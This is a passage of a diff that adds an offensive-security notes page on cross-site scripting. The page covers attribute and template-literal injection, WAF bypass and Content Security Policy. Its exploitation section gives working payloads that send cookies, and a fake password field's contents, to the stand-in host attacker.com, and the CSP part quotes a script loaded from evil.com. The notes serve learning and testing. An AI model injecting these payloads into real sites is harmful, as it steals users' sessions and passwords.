+<li><code>&lt;a href="#" onclick="... var input='controllable data here'; ..."&gt;</code></li>
+<li><code>&amp;apos;-alert(document.domain)-&amp;apos;</code></li>
+<li>The browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted</li>
+<li>HTML encode: https://html.spec.whatwg.org/multipage/named-characters.html</li>
+</ul></li>
+</ul>
+<blockquote>
+<p><strong>Note</strong>: You cannot use <code>&amp;quot;</code> -&gt; <code>"</code> to close onclick attribute. Remember: The browser HTML-decode the value of the onlick attribute but not the entire structure.</p>
+</blockquote></li>
+<li><p>XSS in JavaScript template literals</p>
+<ul>
+<li><p>JavaScript template literals are string literals that allow embedded JavaScript expressions (Template literals are encapsulated in backticks)</p>
+<div class="sourceCode" id="cb32"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="op">...</span></span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> input <span class="op">=</span> <span class="vs">`controllable data here`</span><span class="op">;</span></span>
+<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a><span class="op">...</span></span>
+<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a>${alert(document.domain)}</span></code></pre></div></li>
+</ul></li>
+</ul>
+<hr />
+<h2 id="bypass-waf">Bypass WAF</h2>
+<p>If you receive an error like “tag is not allowed” or “event is not allowed”, use XSS cheat sheet (<a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a>) to discover a tag and event that work.</p>
+<hr />
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="steal-cookies">Steal cookies</h3>
+<div class="sourceCode" id="cb33"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="fu">fetch</span>(<span class="st">&#39;//attacker.com?&#39;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- or --&gt;</span></span>
+<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span>location<span class="op">=</span><span class="st">&#39;//attacker.com?&#39;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb34"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="fu">fetch</span>(<span class="st">&#39;https://attacker.com&#39;</span><span class="op">,</span> {</span>
+<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a><span class="dt">method</span><span class="op">:</span> <span class="st">&#39;POST&#39;</span><span class="op">,</span></span>
+<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a><span class="dt">mode</span><span class="op">:</span> <span class="st">&#39;no-cors&#39;</span><span class="op">,</span></span>
+<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a><span class="dt">body</span><span class="op">:</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span></span>
+<span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span>
+<span id="cb34-7"><a href="#cb34-7" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>Limitation:</p>
+<ul>
+<li>The victim might not be logged in.</li>
+<li>Many applications hide their cookies from JavaScript using the <code>HttpOnly</code> flag.</li>
+<li>Sessions might be locked to additional factors like the user’s IP address.</li>
+<li>The session might time out before you’re able to hijack it.</li>
+</ul>
+<h3 id="capture-passwords">Capture passwords</h3>
+<div class="sourceCode" id="cb35"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">input</span> <span class="er">name</span><span class="ot">=</span><span class="st">username</span> <span class="er">id</span><span class="ot">=</span><span class="st">username</span><span class="dt">&gt;</span></span>
+<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">input</span> <span class="er">type</span><span class="ot">=</span><span class="st">password</span> <span class="er">name</span><span class="ot">=</span><span class="st">password</span> <span class="er">onchange</span><span class="ot">=</span><span class="st">&quot;if(this.value.length)fetch(&#39;https://attacker.com&#39;,{</span></span>
+<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a><span class="st">method:&#39;POST&#39;,</span></span>
+<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a><span class="st">mode: &#39;no-cors&#39;,</span></span>
+<span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a><span class="st">body:username.value+&#39;:&#39;+this.value</span></span>
+<span id="cb35-6"><a href="#cb35-6" aria-hidden="true" tabindex="-1"></a><span class="st">});&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
+<h3 id="perform-csrf">Perform CSRF</h3>
+<ul>
+<li>When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present.</li>
+<li>If the site use a token you can get it doing a first request and then add the token in a second request</li>
+</ul>
+<hr />
+<h2 id="content-security-policy">Content security policy</h2>
+<p>CSP restrict the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages. CSP defends against XSS attacks in the following ways</p>
+<ul>
+<li>Restricting Inline Scripts
+<ul>
+<li><code>&lt;script&gt;document.body.innerHTML='defaced'&lt;/script&gt;</code> will not work</li>
+</ul></li>
+<li>Restricting Remote Scripts
+<ul>
+<li><code>&lt;script src="https://evil.com/hacked.js"&gt;&lt;/script&gt;</code> will not work</li>
+</ul></li>
+<li>Restricting Unsafe JavaScript</li>
+<li>Others <a href="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html</a></li>
+</ul>
+<hr />
+<h2 id="compress-minify-javascript">Compress &amp; minify JavaScript</h2>
+<p>You can compress and minify your JS by using tools like <a href="https://jscompress.com/">JSCompress</a>.</p>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
